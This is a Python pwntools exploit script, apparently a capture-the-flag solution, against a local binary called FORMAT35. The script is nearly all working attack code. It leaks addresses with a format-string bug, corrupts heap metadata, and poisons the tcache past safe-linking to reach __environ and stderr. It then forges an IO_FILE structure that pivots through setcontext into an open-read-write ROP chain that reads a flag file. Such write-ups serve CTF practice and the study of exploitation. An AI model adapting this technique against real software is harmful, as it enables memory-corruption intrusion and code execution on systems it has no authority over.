#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./FORMAT35')
libc = ELF('./libc.so.6')
elf = ELF('./FORMAT35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#============================base==============================

add(0x100) #0 0x290
#foemat = '%164$p.%165$p.%163$p.%214$p.'
foemat = '%269$p.%270$p.%273$p.%214$p.'
edit(0, foemat)

show(0)
data = p.recv(52)
print(data)

main = int(data[0:14],16) - 139
libcbase = int(data[22:36],16) - 0x29d90 # __libc_start_call_main+128
heapbase = int(data[37:51],16)
key = heapbase >> 12

pr('main',main)
pr('libcbase',libcbase)
pr('heapbase',heapbase)
pr('key',key)

#==============================================================

add(0x420) #1 0x3a0
add(0x420) #2 0x7d0
add(0x420) #3 0xc00
add(0x100) #4

chunk1_pre_size = heapbase + 0x3a8
foemat = fmtstr_payload(8, {chunk1_pre_size : 0x861}, numbwritten = 0).ljust(0x80, "\x00")
edit(0, foemat)
show(0)

delete(1)
delete(3) # chunk 1 2 3 合并
add(0x420) #5 use chunk1 0x3a0

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
setcontext_door = libcbase + libc.sym['setcontext'] + 61
environ_addr = libcbase + libc.sym['__environ']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret
ret = prdi_ret + 1 # ret

#==========================stack===============================
#在 unsortedbin 中分配两个块，可以控制的是 6 (即chunk2的指针)

add(0x100) # 6 0x7d0
delete(4) # tcachebin
delete(6) # tcachebin
environ = key ^ (environ_addr - 0x10)
edit(2, p64(environ))

add(0x100, p64(environ)) # 7 tcachebin 0x7d0
add(0x100, '\x20'*0x10) # 8 分配至 environ

show(8)
stack = u64(p.recv(22)[-6:].ljust(8,'\x00')) # 泄露 environ 栈地址
_start_point = stack - 0x50 # 程序 _start_point 地址
_start_point = _start_point - 0x8 # 0x10 对齐
pr('_start_point',_start_point)

# gdb.attach(p)
# pause()

#=======================_start_point===========================

add(0x100) #9
delete(9) # tcachebin
delete(7) # tcachebin
_start_point = key ^ _start_point
edit(2, p64(_start_point))
add(0x100, p64(_start_point)) # 10
add(0x100, '\x20'*40) # 11 分配至 _start_point

show(11)
temp = u64(p.recv(48)[-8:].ljust(8,'\x00'))
start = temp & 0xfffffffff000 # 低三位清零
#start = temp &~ 0xfff # 低三位清零

#==========================stderr==============================

stderr = start + 0x3040 # stderr bss 地址
pr('stderr',stderr)

add(0x100) #12
delete(12) # tcachebin
delete(10) # tcachebin
stderr = key ^ stderr
edit(2, p64(stderr))
add(0x100, p64(stderr)) # 13
add(0x100, p64(heapbase + 0x3a0)) # 14 stderr point fake_IO_FILE

#==========================top_size============================

delete(0) # tcachebin
delete(13) # tcachebin

top_size_addr = key ^ (heapbase + 0x1140)
edit(2, p64(top_size_addr))
add(0x100, p64(top_size_addr)) # 15
add(0x100, p64(0) + p64(0x301)) # 16 change top_chunk size

#======================fake_IO_FILE============================

context_addr = heapbase + 0x4b8
IO_FILE_addr  = heapbase + 0x3a0

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(0) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(0) # _IO_buf_base
fake_IO_FILE += p64(1) + p64(0) # _IO_buf_base != _IO_buf_end
fake_IO_FILE += p64(context_addr) # rdx -> context_addr
fake_IO_FILE += p64(setcontext_door) # _IO_save_end = call(setcontext + 61)
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr + 0x30) # _wide_data = rax1
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps + 0x10) # vtable = _IO_wfile_xsputn + 0x10 = _IO_wfile_seekoff
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(IO_FILE_addr + 0x40)  # rax2

#=============================orw==============================

frame = SigreturnFrame()
frame.rsp  = context_addr + 0x100 # rsp -> orw
frame.rip  = ret

payload  = str(frame)
payload  = payload.ljust(0x100,'\x11')
flag_addr = context_addr + 0x200

# open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'

#==============================================================

edit(5, fake_IO_FILE+payload)

# gdb.attach(p)
# pause()

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x600))
p.interactive()
